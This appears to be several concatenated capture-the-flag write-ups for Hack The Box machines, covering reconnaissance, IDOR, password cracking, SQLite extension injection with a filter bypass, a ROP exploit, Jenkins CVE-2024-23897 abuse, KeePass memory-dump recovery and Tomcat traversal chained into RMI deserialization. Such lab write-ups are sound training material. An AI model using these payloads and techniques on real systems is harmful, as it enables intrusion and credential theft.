I’ll download the (latest release](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe) to my host, and serve it with a Python web server. From Visual, I’ll fetch it:
Running it without args gives the usage, and running the example shows it gets system:
I’ll get a reverse shell and run it:
It just hangs, but at nc:
And I can grab the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 14 Oct 2023
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered pppCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80), as well as port 3000 filtered:
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal. There’s a redirect on 80 to http://drive.htb. Given the user of domain names, I’ll brute force for any subdomains that respond differently on the webserver, but not find any. I’ll add drive.htb to my /etc/hosts file.
The site is for a cloud storage service:
Only three links on the page go off the page,”Contact Us”, “Register” and “Login”. The rest of the links jump around on this page. There are some names and positions, as well as a couple @drive.htb email addresses. There’s also a “Subscribe” box at the bottom. Entering an email and hitting submit sends a POST request to /subscribe/, which returns a 302 Found. It’s not clear if these are processed or not.
The /contact/ page has a form:
Submitting sends a POST to /contact/, and the response shows a message:
I’ll send some XSS payloads, but nothing every connects back.
Registration goes to /register/:
Login at /login/ looks similar:
Once I log in, there’s a /home/ page that shows files:
The only file there has a message from the admins:
In the “Files” menu, I can upload a file, and it tells about the kinds of files that are accepted above the form:
I can upload a file, and then there are more options than “Just View”:
I can also mark a file as reversed in the “Files” menu. When I pick a file, it sends a POST to /blockfile/:
Then I’m redirected to the dashboard, where it shows up with my handle in the “Reserve” column:
In the “My Files” section, there’s a way to do this with a GET request:
This sends a GET to /112/block/, where 112 is the ID for the file (viewing the file is at /112/getFileDetail/).
There are also Groups. I can create a group and add users to it, comma separated. I’ll try adding users that don’t exist:
When viewing the group, I’ll see that “admin” is added, but the two non-sense ones are not:
This is a way to enumerate users.
The “Reports” section shows my activity:
The HTTP response headers show only nginx:
csrftoken is the default name for this protection in Django (the Python web framework), so that could be a sign. The 404 page also matches this reference for the Django 404:
I’ll start feroxbuster on the site, but after a minute is starts returning 500s
There’s nothing super interesting in here that I don’t find by browsing the site.

Category: Shell as martin
The URL for a group is /[id]/getGroupDetail/. Similarly, the URL for a file is /[id]/getFileDetail/.  I’ll test to see how other ids respond. For example, groups:
Here, I have ffuf hit http://drive.htb/FUZZ/getGroupDetail/ to check for all group numbers. For the wordlist, I’ll use -w <(seq 1 500), which uses process substitution to pretend there’s a file containing the numbers 1 through 500 one per line. -fc 500 will hide results that return HTTP 500, which is what happens when there’s a non-existent id. I’ll also need to include my cookie, which I can grab from Burp.
I’ll note that the last three are groups I created (47-49) and return 200. The others, 28, 39, 40, and 42, return 401. Trying to visit these return 401 Unauthorized:
I can do the same attack on files:
There are two files I can access. 112 is the test file I uploaded, and 100 is the “Welcome_to_Doodle_Grive!” file owned by admin. There are four other files that I can’t access - 79, 98, 99, and 101.
It’s worth noting that while I would expect an API endpoint like /[id]/block/ to set the reserved attribute to my user id, that actually returns a page:
The /[id]/block/ page will show files that I otherwise can’t access:
This is an insecure direct object reference (IDOR) vulnerability.
The four files each contain some clues about the rest of the box. 101 (above) has references to a scheduled backup for the DB in /var/www/backups (that may change) that has a strong password.
ID 98 has references to an edit functionality:
99 has says that the dev team needs to stop using the platform for chat, and references security issues:
Most importantly, 79 has a username and password:
That username and password work for SSH access to Drive:

Category: Shell as tom
martin’s home directory is basically empty:
There are three other directories in /home:
martin is not able to access any of them.
There are two scripts in /opt:
Interestingly, they are only accessible to the www-data user.
In /var/www, there are three directories:
Only www-data can access DoodleGrive, and html is just the default nginx page:
backups is what was mentioned in the file:
I am able to list the contents of each backup:
Each archive contains a db.sqlite3 file. The timestamps for the archives and the databases inside them are very confusing. I’m going to chalk that up to poor work on the author / HTB’s part and try not to read too much into it.
Trying to unpack any of the archives prompts for a password:
No password I have so far works. I could try to exfil them and crack the password, but first I’ll look at db.sqlite3, which I can access:
There’s nothing too interesting in here. The accounts_customusers table has hashes, and I can quickly crack tomHands password of “john316”, but I don’t yet has a use for it.
nmap identified that port 3000 was handling requests differently, showing it as filtered. It shows up in the netstat as well:
curl shows that this is a Gitea instance:
To get better access, I’ll use SSH to create a tunnel from port 3000 on my box to port 3000 on Drive with -L 3000:localhost:3000 . Now in Firefox:
On the “Explore” link, there are a couple of users visible to unauthenticated users:
I am able to register myself an account, but it doesn’t give access to anything additional.
One of the users is martinCruz, and I have a password for a martin user already. I’ll try it here, and it works! martin has access to one repository that was not visible before:
This repo is for the website:
I’ll note a couple things:
db_backup.sh was added in a commit titles “added the new database backup feature”, which was on 22 December 2022. The script itself has the password for the archives:
The geeks_site folder has a last comment message referencing going back to “default Django hashes due to problems in BCrypt”, dated 26 December 2022. That specifically applies to a settings.py file. The history of the file shows it set to SHA1 to Bcrypt and back to SHA1:
With the password, I’ll revisit the backup archives. I can extract each to /dev/shm with the following command:
After doing all four, I have:
Each of the backups are basically the same as each other and the db.sqlite3 that I could access above. I’ll show the general structure here, and call out the differences later.
The database looks like a Django DB based on the table names:
A bunch of the tables are empty. myApp_file has the content from the files I was able to read with the IDOR:
Most interesting is the accounts_customuser table, which has hashes for users that match up nicely with some local accounts on Drive:
There are tables with group names and how they tie to files, but nothing too interesting.
One place that I see differences is the myApp_file table, as the older backups don’t have as many messages. Still, there’s nothing I haven’t seen before.
Another place to look for differences is in the accounts_customuser table. I’ll loop over each and dump the hashes:
The BCrypt hashes (start with pbkdf2) are going to be very difficult to crack. I’ll start with the others. There are eight unique hashes, four of which belong to tom:
I’ll take the usernames and hashes from the backup DB and send them through hashcat:
All four passwords for tomHands crack.
To quickly check is any of these work over SSH, I’ll create a text file with one per line, and feed it to netexec:
It works!
I’ll connect over SSH:
su also works from the shell as martin:
Either way, I can grab user.txt:

Category: Shell as root
In the tom user’s home directory, there’s a doodleGrive-cli file that’s owned by root and set as SetUID:
The README.txt says:
Running it prompts for a username and password:
I’ll pull the binary to my host with scp:
The file is a 64-bit Linux executable:
Running strings on the binary shows a few clues. The program uses SQLite and the database in the web directory:
There’s a menu:
There are strings about logging in:
With just this, I can guess the username of moriarty and password “findMeIfY0uC@nMr.Holmz!” (which does work).
I’ll open it in Ghidra and once it finishes analysis, go to main. After a bit of renaming / retyping, it looks like:
The username and password are static checks for “moriarty” and “findMeIfY0uC@nMr.Holmz!”, just as I predicted when looking at strings.
This function looks a bit complex, but it is just looping through the string and removing any characters that match a given deny list:
The bad characters are in hex “5c7b2f7c20270a003b”, which is “\{/| ‘\n\00;”. This is a bit of an odd list, but it will prevent some attacks such as SQL injection.
This function offers the menu, parses the input, and calls the matching function:
It only checks the first byte of input for ASCII 1-6, and option 6 just exits.
Each of the menu options calls a function with system and the output will be shown to the screen. For example, show_users_list:
In this case, it runs a SQLite query. The others each call system with a different command:
Each of these runs without user input, so there’s not much I can do to mess with them.
Option 5, activate_user_account, is similar to the others, but it takes user input:
It updates the is_active value for a user to 1.
There are multiple vulnerabilities in this binary that can lead to a root shell:
This is method involves abusing the edit SQL function. This function allows an interactive user to specify a binary that will apply to each value from a column as they are used.
If the second argument is omitted, the VISUAL environment variable is used.
So if I can set this environment variable, it will call a program for me.
Locally I can try this on the db.sqlite3 file on my local system:
By setting VISUAL to cat, it calls cat on each column one by one as part of the query.
I don’t need to bypass the filter at all, as none of these characters are removed.
I’ll start the CLI and authenticate:
I’ll select option 5, and give it my injection:
When I hit enter, it open vim with the text “admin”. I’ll enter :!/bin/bash to execute bash from within vim, and it drops to a root shell:
This shell has no PATH, so I can either set it, or run everything with full path:
The activate_user_account function asks for input which is used to build a command string. If I can bypass the filter function, then I can inject into that SQLite call. The PayloadsAllTheThings page on SQLite shows this POC for getting RCE via SQLite:
It’s loading a DLL from a file share to run on a Windows host. Still, this is enough to get me looking at the load_extension function, which seems to load a shared object file and call sqlite3_extension_init.
First I want to get a payload that will run. I’ll create a very simple POC program in C:
I’ll compile that into a shared object:
Now I’ll run sqlite3 and try to get it loaded. To run commands from the command line, I’ll need to give it a DB to open, but it doesn’t have to actually exist if I’m not querying any tables:
The same way, I can call load_extension:
The fact that I see id output shows it ran my extension.
The program runs the following:
It is putting my input in double quote marks. So to inject out of that, I need send something like:
That would make the SQL:
On my machine, I’ll try that:
This is actually cool because it’s showing how the extension is loaded, and it returns nothing, which becomes the empty column in the output. The junk after the -- - is just to make sure the comment works.
For this to work, I need to use the / character, which is banned. I don’t have a good way to reference my shared library without it. However, load_extension takes a string. In the above example I hardcode it, but there’s no reason that string can’t be the output of a function. For example, char (docs). “./poc” as a list of ints is 46, 47, 112, 111, 99. So I can do:
Putting that all together, I’ll generate a SO to run on Drive:
It’s important to give the full path, as the binary drops the PATH variable. I’ll compile it:
I have to make this short. The input user name is limited to 0x28 = 40 characters:
To do "+load_extension(char(46,47,112,111,99));-- - is 45 characters. If I name my extension p.so, I’ll work fine as "+load_extension(char(46,47,112));-- - at 38 characters.
Now from /dev/shm (so that ./p.so works), I’ll run doodleGrive-cli. After authenticating, I’ll select 5 and give the injection:
It ran id!
I’ll update my poc.c to make a copy of bash and set it as SetUID/SedGID (I like this better than just changing /bin/bash as to not accidentally spoil for other players).
I’ll compile that over p.so and run the exploit again. Now there’s a SetUID/SetGID binary at /tmp/0xdf:
Running with -p (to not drop privs) gives a root shell and the flag:
There’s nothing here I haven’t shown many times before, but I’ll give a quick walkthrough as it is the intended way.
In main, there’s a format string vuln, where the user input name is printed as the first argument to printf:
That printf call takes place at the 0x40229c. The stack canary is set at 0x402202. I’ll break at both of those in gdb:
I’ll run to the first break, and then step to see the canary get set in RAX and then pushed to the stack. In this run, its set as:
I’ll run to the next break, putting in whatever as a username. When it gets there, I’ll look at the stack:
The space for input is small, but I can read the i-th word on the stack with %i$lx, where i is a number.
I’ll use a simple Bash loop to try different offsets:
15 looks like the best candidate to be the carary. If I run the loop a couple more times, most of the values stay basically the same, but 15 is completely random. That’s the canary.
The output looks like this:
Next I’ll get the offset of the overflow to overwrite RIP. The entered_password buffer is 56 bytes long, but it’s read into unsafely up to 400 bytes:
I’ll create a pattern:
I’ll set a break point at the place where the canary is checked:
I’ll run, entering whatever for the username and the pattern for the password. When it hits the break point, I can see it’s just loaded the canary off the stack into RCX:
This value is the part of the pattern that ended up as the canary. pattern_offset will show how far into the pattern that is:
So I want 56 bytes then the leaked canary and then the return address.
My strategy is going to be to call system("/bin/sh"). I’ll need a /bin/sh string to pass to system. I can’t send it myself, as / is a banned character. But it exists in the binary:
Because the binary has PIE disabled, this should be at the same place every time:
I’ll also need the address of system (and exit if I want to be clean), and those are easily found with pwntools in Python by loading the binary (elf = ELF("./doodleGrive-cli")) and then referencing the addresses (elf.sym.system and elf.sym.exit).
Finally, I need two gadgets. In 64-bit, the first argument to system will be the string at the address in RDI. So I need a pop $rdi; ret gadget. I’ll also need a plain ret gadget for stack alignment.
Ropper is a nice tool for this:
The last one looks perfect. And 0x401913 (one byte after) is just ret.
I’ll generate the following script:
Running this locally gives a shell:
If I give it the SSH argument, it works remotely:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 12 Feb 2024
OS : Linux
Base Points : Medium [30]
Creators : polarbeareramra13579
Nmap scan:
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxyCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (8080):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
There’s a robots.txt file on the webserver on port 8080 disallowing bots to scan any of the site. And the title seems to be a Jenkins server. I’ve seen Jenkins before on HTB. Jeeves released in 2017, and Object was a part of the 2021 HackTheBox Uni CTF. I played with an RCE vulnerability in Jenkins (CVE-2019-1003000) on Jeeves in this 2019 blog post.
The site is a Jenkins instance:
The people tab shows one user, jennifer:
The build history is empty. The “Credentials” page shows some basic info:
There’s a single credential that is a root SSH private key:
I can’t get access to it.
The site is clearly Jenkins, which describes itself as:
The leading open source automation server, Jenkins provides hundreds of plugins to support building, deploying and automating any project.
As soon as I visit the page, the first request provides a JSESSIONID cookie:
That makes sense, as Jenkins is a Java application. The server is Jetty, a Java web server.
I’m going to skip the directory brute force given that I know exactly what this application is.
CVE-2024-23897 is the reason this box was released by HTB as a non-competitive box to showcase this hot vulnerability. It was first discussed mid-January 2024, with Jenkins making a Security Advisory on 24 January here. The title is “Arbitrary file read vulnerability through the CLI can lead to RCE.
Jenkins has a CLI interface to control it from a scripted / automation / shell environment. In that, a feature was added where a @[filepath] would be replaced with the contents of the file. This leads to a file read.
The advisory shows five ways this can be leverages into remote coded execution, as well as some other abuses.
The Jenkins CLI documentation shows that you actually get the CLI JAR from the Jenkins instance. I’ll download it:
On running it, I’ll give it help and then a non-existent command, and it prints all the commands:
Those command run as well:
From the advisory, I can try putting in a file reference:
It’s trying to load /etc/passwd as arguments for the help command. The first line is the command (root), and the next is an unexpected argument. That’s partial file read for sure. For one line files, this is enough (adding an extra arg, in this case “a”, makes the output much shorter):
The hostname is “0f52c222a4cc”.
There are Python POCs out there on GitHub that will do a similar thing. They don’t really add anything over the JAR file, so I prefer that method. They do work to make similar output:
In this video, I explore the vulnerability, walk through exploitation with both the JAR and the Python POC, and show the path to finding a method to leak more lines:
By the end of the video, I’ve got this output:
All of the “19” results seem equally good.
I’ll look at the running command to get a feel for what the environment looks like for Jenkins. The command line (/proc/self/cmdline, cleaned up with spaces added) is:
The environment variables (/proc/self/environ) are:
I can actually read user.txt at this point from the jenkins user’s home directory:
Jenkins stores the initial password for the admin user at /var/jenkins_home/secrets/initialAdminPassword. Unfortunately, that returns “No such file”:
Jenkins stores information about its user accounts in /var/jenkins_home/users/users.xml. Using reload-node, I’ll get the lines of that file, albeit a bit scrambed:
Still, I can see a user “jennifer_12108429903186576833”, which matches the jennifer user on the site above. That is a directory name and in it will be a config.xml:
It’s scrambled, but the last line is:
The hash matches multiple Bcrypt formats. Trying to give it to hashcat returns that I need to give it a format:
I’m giving it --user which treats “#jbcrypt” as the username.
The basic bcrypt format works and cracks very quickly:
I get the password “princess”, and this works to log into Jenkins as jennifer.

Category: Shell as root
Even logged in, I still can’t directly access to the private key for root. There is an update option now:
Going into it, there’s a place there the key would be, but it is “Concealed for Confidentiality”:
This is likely used by pipelines to SSH into the host system as root and deploy things.
Interestingly, it is there in a hidden form field (encrypted):
Under “Plugins” in “Manage Jenkins”, there’s are a few. One of interest is the SSH Agent Plugin and SSH Build Agents Plugin:
I’ll show two ways to take this access to Jenkins as root to Root access on Builder. Both of them abuse the setup that has saved an SSH key into Jenkins. This is commonly done so that once the build process is complete, it can put artifacts (like a website) into place on the desired server.
I’m able to grab the base64 data from the hidden field and decrypt it very easily using the script console (from the main dashboard, go to “Manage Jenkins” -> Script Console):
On the main page, I’ll create a new job:
On the next page, I’ll give it a name and select Pipeline:
On the next screen, I’ll define the pipeline. I can leave most of it as is, and just fill in the “Pipeline script”. The “try sample pipeline” button will offer a starting format.
If I save this and go back to the job page and click “Build Now”, the job runs. In the “Console Output” of the result, it shows the print:
These docs show how to use the SSH Agent plugin. I’ll paste in their POC as the pipeline:
I clearly need to change the IP. I’ll also need to change the “credential”. The docs show that it takes a list of strings. Trying with “root” fails:
Looking at the credential, it seems the ID is actually just “1”:
I’ll update to that:
And it works:
I’ve successfully run commands on the host.
I’ll update the command from uname -a to find /root. In this build, it returns a full read of all the files in /root:
I could read root.txt, but I’ll grab that SSH private key instead, changing the command to cat /root/.ssh/id_rsa:
It’s the same key as the previous method.
If the pipeline can use the SSH key to get on to the host system as root, then it has access to the SSH key itself (I’ve already shown it can decrypt it). This post talks about dumping credentials. There’s a good bit in the post about how to get it to print the credential unmasked. With a bunch of attempts and troubleshooting, I end up with:
When I run that, it prints the SSH key.
Regardless of how I get it, with the recovered key (and permissions set to 600), I can SSH as root into Builder:
And get root.txt:
###
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 12 Aug 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
Visiting http://10.10.11.227 returns a plain page with a single link:
I’ll take this opportunity to brute force for any other subdomains on keeper.htb with the command:
It doesn’t find anything. I’ll add keeper.htb and tickets.keeper.htb to my /etc/hosts file:
keeper.htb just returns the same page:
The site presents an instance of Request Tracker (RT), a free ticketing system:
Without creds, there’s not much else to explore here.
The version of RT is given in the page footer as 4.4.4. A quick search for vulnerabilities in this version didn’t turn up anything too interesting.
The HTTP response headers show nginx:
There’s a cookie set on first visiting the RT page. Nothing else of interest.
Given that this is a known piece of free software, I’m going to skip the directory brute force for now.

Category: Shell as lnorgaard
Searching for the default creds for RT shows root:password:
Those work here!
Logging in provides access to the dashboard:
There aren’t any tickets appearing in the categories it’s trying to show. There is one Queue, General, which has one new ticket. Clicking on that shows it’s an issue with Keepass:
The ticket history gives a bit more information:
There’s an issue with Keepass, and the lnorgaard user has a crashdumb for the root user.
Clicking on the user shows details for the user, but nothing new:
However, as root, I can edit the user (button first from the left in the menu):
This password works for the lnorgaard user over SSH:
And I can grab user.txt:

Category: Shell as root
As mentioned in the ticket, there’s a zip archive in lnorgaard’s home directory:
I’ll pull it back to my host using scp (it’s 84MB, so it takes a minute):
It has two files in it:
There’s a 2023 information disclosure vulnerability in KeepPass such that:
In KeePass 2.x before 2.54, it is possible to recover the cleartext master password from a memory dump, even when a workspace is locked or no longer running. The memory dump can be a KeePass process dump, swap file (pagefile.sys), hibernation file (hiberfil.sys), or RAM dump of the entire system. The first character cannot be recovered. In 2.54, there is different API usage and/or random string insertion for mitigation.
I have a dump of the KeePass memory, so this seems like a good thing to try. I’ll show how to do it from both Linux and Windows.
At the time of Keeper’s release, there was really only one POC exploit on GitHub named keepass-password-dumper in DotNet.
The issue is not that the KeePass key is in memory. It’s that when the user types their password in, the strings that get displayed back end up in memory.
For example, let’s take the password “password”. The first character goes in as a “●” (which is \u25cf or \xcf\x25 in memory). The next character comes, and it will show up as “●a”. Then the next character will be “●●s”, then “●●●s”, then “●●●●w”, and so on, until we get to “●●●●●●●d”.
The exploits look through memory for strings that start with some number of “●” and then one character, and build out the most likely master key.
I can take a look at this manually using strings and grep. With -e S, strings will look for 8-bit characters, which will include what’s needed for the “●” (though it will show up as “%” in my terminal). Then I can grep for strings that start with two “●” to see potential matches for the keys being input:
This method is crude, but I can see the third character is likely “d”, and then “g” then “r”. This is what the exploit POCs will do, but a bit smarter to find the most likely key.
From a Windows VM, the exploit is rather straight forward. I’ll clone the repo to my host and go into that directory (if git isn’t installed in your Windows VM, you can also download the ZIP from GitHub and unzip it):
Then I just need to dotnet run [dump]:
That’s most of the password, with the first character missing and options for the second.
Many people seem to say this is not possible from Linux, and that just isn’t true. It does matter that I have dotnet installed, and the correct runtime version. I had a really tricky time getting that working in my Ubuntu VM. Following these instructions seemed to work to get dotnet 8.0 installed:
Running the exploit (going into the exploit directory and running dotnet run [path to dump]) returns an error:
It seems like I should just be able to install the v7 runtime, but I couldn’t get that to work.
This is a great case to switch to Docker. I asked ChatGPT for the right container:
I’ll run that container (the first time it needs to pull the image down to my host), and it drops me at a root shell:
The -v $(pwd):/data will mount the current directory (where the dump is) into the container in /data. I’ll clone the exploit and go into that directory:
Now the exploit runs fine:
That’s the same output as above.
Since the release of Keeper, many Python versions of this exploit have come out. I had a hard time finding one that worked as nicely as the DotNet version. For example, this one will get most of the password:
It knows it doesn’t know the 0 char, but it also skips the 1, 5, and 14 char as well (5 and 14 show up as “ø” in the original POC). Still, it’s enough to continue.
The exploit has a limitation of not getting the first character. The DotNet version also gives a list of possibilities for the second character, and gets the rest. Searching for the string minus the first two characters is enough to find a known phrase:
It’s adding a “rø” to the front, which fits the pattern. Even the less complete output from the Python script works here:
That password works to get into the passcodes.kdbx file using kpcli (apt install kpcli):
There are two entries in the passcodes/Network folder:
I’ll go into that directory:
show with -f will show the passwords. For example:
The more interesting on is the SSH key for the server:
To use this key on Linux, I’ll need to convert it to a format that openssh can understand. I’ll need putty tools (sudo apt install putty-tools). I’ll save everything in the “Notes” section to a file, and make sure to remove all the leading whitespace from each line.
Then I’ll convert it:
Now it works:
And I’ll grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 22 Jul 2023
OS : Linux
Base Points : Insane [50]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
5000/tcp open  upnp
5001/tcp open  commplex-linkCategory: Recon
nmap finds four open TCP ports, SSH (22) and three HTTPS (443, 5000, 5001):
Based on the OpenSSH version, the host is likely running Ubuntu 18.04 bionic. Port 443 is redirecting to www.webhosting.htb. Port 5000 seems like Docker Registry. Port 5001 is something under TLS and HTTP.
The site is clearly using virtual host routing, so I’ll fuzz for additional subdomains that respond differently from the default case (which seems to be a redirect to www.webhosting.htb). On port 443, it only finds www:
There’s a lot of fuzzing I should do from here (trying each web service, subdomains of www.webhosting.htb), but none of them will find anything interesting.
The site is for a web hosting company:
There’s an email on this page (contact@www.webhosting.htb), but otherwise not much interesting. The “About” page (about.html) is similar.
The Login and Register forms are similar, and located at /hosting/auth/signin and /hosting/auth/signup respectively. I’ll sign up:
On logging, I’m redirected to /hosting/panel, where I get a panel to control my domains:
I can create a domain:
And then it gives an index.html and allows me to add and modify files in the space:
If I click the “Open” button it opens https://www.static-[domain id].webhosting.htb/. Once I update my /etc/hosts file, this shows the page:
I’ll look at how the webserver is configured to support dynamic domains like this in Beyond Root.
There’s a profile page (/hosting/profile) that allows me to update my info and see my domains:
The initial site seems like static HTML. There’s only index.html and about.html, and nothing else of interesting. Once I get into /hosting, it behaves differently. On first visiting the signin or signup pages, it sets a JSESSIONID cookie:
This suggests this is a Java application.
I’ll also note a difference in the 404 responses when visiting a non-existent page on the root of the site vs one in the /hosting folder. /0xdf returns the nginx 404 page:
/hosting/0xdf returns a 302 redirect to /hosting/auth/signin. From this, it seems likely that nginx is handling the root, but forwarding anything in /hosting to a Java application.
The TLS certificate for the site shows no DNS name or subject alternative names, just the contact email:
I’ll run feroxbuster against the site. I’m not going to bother with checking the .html extension (though I might in the background later) as it adds a lot of requests and not much potential value:
I’ll note the META-INF and WEB-INF directories. They both return 404, but a different 404 than the default that’s being filtered.
I run feroxbuster in the mode where it smart filters. I’ll also note that feroxbuster adds another default filter after it starts in /hosting.
Nothing else too interesting here.
The TLS certificate on port 5000 and 5001 is for *.webhosting.htb as well as the DNS name webhosting.htb:
Visiting https://10.10.11.223:5000 returns an empty page. nmap said it was Docker Registry. The HackTricks page 5000 - Pentesting Docker Registry has this list to identify Docker Registry:
I’ll try /v2/, but I get a 401 Unauthorized response:
I’ll note the Www-Authenticate header shows that https://webhosting.htb:5001/auth is the authentication service for this service, and the service name is “Docker registry” (case matters). Given that it’s using the domain webhosting.htb (without “www”), I’ll start using that as well.
Visiting this page returns:
I can directory brute force to find /auth, or look at the headers above. Either way,it returns two tokens:
Those are JWT tokens, and they are the same. If I decode the middle block (the first is the header and the last is the signature), I’ll get:
That lines up nicely with the Token Authentication Implementation article on the Docker Registry documentation.
To use the token, the page above says to send it in an Authorization: Bearer [token] header. If I send that token, it still fails:
That’s because there’s no access in that token.
The token auth docs show requesting a token from the following URL:
That seems like a way to request different privileges. The 401 gave a URL of /auth rather than /token. The service must be “Docker registry” as shown in the header above. For the scope, this GitHub issue shows that registry:catalog:* is a way to request the catalog. I’ll try that:
That token seems to have full permissions on the aud (Audience) of “Docker registry”. It works to query:
I’ll use this bash to save the token in an env variable:
/v2/_catalog will list the catalog:
There’s a repository named hosting-app.
Just like I showed in Registry, I can request a tags list for the repo with /v2/[repo]/tags/list. Unfortunately, it fails:
It shows the action I’m trying to do as pull. I’ll request that from the auth server:
There’s one tag, latest.
The manifest contains all the layers for the image, which I can request using the /v2/[repository]/manifests/[tag] endpoint:
There’s a ton here. The top has a key, fsLayers, which is a list of blobSum objects which are sha256 hashes. Each of these represents a commit to the image and contains some parts of the file system as a diff from the previous. They can be downloaded from /v2/[repository]/blobs/sha256:[hash].
Still, there’s no reason to manually do this.
If I try to fetch the image with docker, it complains of untrusted certificates:
I’ll fetch the certificate with openssl:
I need all the stuff between “BEGIN CERTIFICATE” and “END CERTIFICATE”:
Now I’ll run update-ca-certificates and restart the docker service:
Now, when I run docker pull, it’s smart enough to visit port 5001, get the auth it needs, and pull the image:
I can also save a copy of the app locally:
It’s not important for solving the box, but I was curious how docker got auth without my telling it, which I’ll explore in this video:
There are tools out there designed to pull Docker images from registries. DockerRegistryGrabber is a nice one. It’s worth noting at the release of RegistryTwo it did not support using auth tokens, but it seems the box may have influenced adding that feature:
It doesn’t seem to be smart like docker to get the auth token on it’s own, but I can pass it a token and have it do things. With the catalog token, it will list:
That same token will fail to download, but switching just like above, it will get all the blobs:
They are all all gzip data:
I could dig into each of these individually, which would show me what stands out from the base image, but I’ll start by running the container.
Rather than enumerate all the layers of the image, I’ll start it and take a look:
Looking at the running image shows the image command is catalina.sh run:
Catalina is the Tomcat servlet container. catalina.sh is a part of tomcat, and the run command starts Catalina.
The script is in /usr/local/tomcat/bin/:
In /usr/local/tomcat/webapps there’s a hosting.war file. This is the application that manages the website at /hosting. I’ll copy it to my system from the container:
A Java WAR file is a Java archive containing all the files needed for a web application. I’ll open this one in jd-gui.
META-INF has very basic metadata about the application. The resources has CSS and the .jsp and .html files at the bottom are templates for the various pages. The interesting stuff is in WEB-INF. web.xml is a basic config file. lib has the various libraries used by the app:
jsp has various templates for different pages on the site:
The classes directory has the code for the side:
The class files in services are the ones that define routes for the webserver. For example, in AuthenticationSevlet.cass, it defines the /auth/signin route:
The doGet and doPost methods handle those requests, eventually making a RequestDispatcher referencing one of the .jsp files as a template. Other endpoints defined as /autosave, /reconfigure, /panel, /domains/*, /edit, /logout, /profile, /auth/signup, and /view/*.
The rmi folder is of particular interest. RMI (remote method invocation) is a Java idea kind of like remote procedure calls (RPC) in C, but rather than sending data structures, Java objects are passed between processes. This post does a really nice job of going into detail as to not only what RMI is, but how to pentest it (it is in Chinese, but Google Translate does a nice job).
The RMIClientWrapper.class file creates a RMIClientWrapper object, which gets the FileService:
The interesting part is that it loads up the rmi.host from the Settings class, and as long as it ends in .htb, it will connect to port 9002. If I can get that to connect to me, there will be a way to exploit it.

Category: /reconfigure
There is a /reconfigure endpoint that is also interesting:
The POST request handler updates the Settings object with whatever is passed to it. There is, however, a call to checkManager first before a user is allowed access via either GET or POST. This function checks the user’s session object for the Is_LoggedInUserRoleManager variable to be set.

Category: Shell as app in Container
A common misconfiguration to look for in Tomcat servers is a path traversal with ..;/. It has a section in Hacktricks, and goes all the way back to the famous 2018 Blackhat presentation I’ve referenced many times, Breaking Parser Logic! by Orange Tsai:
Given that it seems clear that nginx is handing off to Tomcat at the /hosting level, it’s worth trying there. If I try to visit /hosting/..;/, it returns an empty 404. That’s different than if I visit /hosting/0xdf, which redirects to /hosting/auth/signin. That’s a good sign this issue is present. I’ll try /hosting/..;/manager/html, and it asks for basic auth:
When I don’t have the password, it shows the Tomcat auth failed page:
Even if I can’t access the Tomcat manager, that looks like path traversal.
Without creds, I can’t access the Tomcat manager admin panel. Another thing to look for on Tomcat is the examples directory. Visiting /hosting/..;/examples/ finds the page:
One Example that shows up in a lot of bug bounty reports / blog posts (example, example, example) is SessionExample, in the “Servlet examples”:
Through this page, I can get and set session attributes for my session. If I don’t have a session with the site, it looks empty like that. If I log in:
If I open a file for editing in the file editor on www.webhosting.htb and refresh this Sessions Example page, there’s a new attribute associated with my session:
The attribute looks like s_EditingMedia_[base64 id] = /tmp/[random hex]. The URL for editing a file is /hosting/edit?tmpid=[base64 id], matching that session attribute.
I’ll update the value of that session attribute to be /etc/passwd using the example form:
On reloading the /edit page, there’s /etc/passwd:
Trying to save returns a 500 error (which makes sense, as this user almost certainly can’t write this file).
One unintended path is to use this file read to completely skip the Docker Registry stuff above, and pull the War file here. I’ll show that in Beyond Root.
I noticed above that I needed an admin session to get to /hosting/reconfigure. If I visit while just normally logged in, it redirects to /hosting/panel. But, if I set s_IsLoggedInUserRoleManager to anything via the Session Example and try again, it works:
This panel gives the opportunity to change the max domains and index template.
Submitting the form on /hosting/reconfigure sends a POST request setting domains.max and domains.start-template:
Looking again at the code that handles POST requests, it doesn’t seem to worry about POST parameters are sent:
It just loops over all the POST parameters, maps them into a map object, and passes that to update the settings. That’s going to be vulnerable to mass assignment.
The RMI class starts by getting the settings value for rmi.host, which I should be able to set via the mass assignment vulnerability above. However, it then checks that the value ends with “.htb”, setting it to “registry.webhosting.htb” if it doesn’t:
I can by pass this with a null byte. I’ll send the /hosting/reconfigure POST request to Burp Repeater, and add &rmi.host=10.10.14.6%00.htb to the end:
It seems to work. I’ll start nc listening on 9002, and on loading /hosting in a browser, there’s a connection:
One of HTB’s top players qtc has a tool, remote-method-guesser, which has a listen mode:
Sometimes it is required to provide a malicious JRMPListener, which serves deserialization payloads to incoming RMI connections. Writing such a listener from scratch is not necessary, as it is already provided by the ysoserial project. remote-method-guesser provides a wrapper around the ysoserial implementation, which lets you spawn a JRMPListener
That’s exactly what I need here. I’ll need to have a copy of the ysoserial Jar file on my host. Mine is at /opt/ysoserial/ysoserial-all.jar. There’s a bunch of issues with this tool with newer versions of java. This issue on it’s GitHub talks about how to make it work with OpenJDK17, but also mentions it just works with OpenJDK11. I’ve got 11 installed on my system, so I’ll just use update-alternatives to select it:
This fixes errors like this:
